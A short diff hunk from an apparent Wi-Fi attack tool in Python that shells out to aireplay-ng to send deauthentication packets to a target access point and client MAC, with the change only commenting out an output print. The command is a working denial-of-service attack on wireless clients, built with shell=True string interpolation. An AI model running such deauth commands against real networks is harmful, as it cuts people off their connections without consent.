@@ -158,7 +158,7 @@ class Functs:
                 Functs.ChannelSys.hopper(channel)
                 try:
                     out = check_output(f"""aireplay-ng -0 5 -a {bssid_} -c {get_var('target_mac')} {get_var('interface')}""", shell=True)#, stdout=DEVNULL, stderr=STDOUT)
-                    print(f"""==============OUTPUT============\n{out.decode()}\n================================""")
+                    #print(f"""==============OUTPUT============\n{out.decode()}\n================================""")
                     if f", but the AP uses channel" in out.decode():
                         print(f"""=========Trying to get channel============\n{out.decode()[out.decode().find(f"AP uses channel")::]}\n===========================================""")
                 except KeyboardInterrupt:
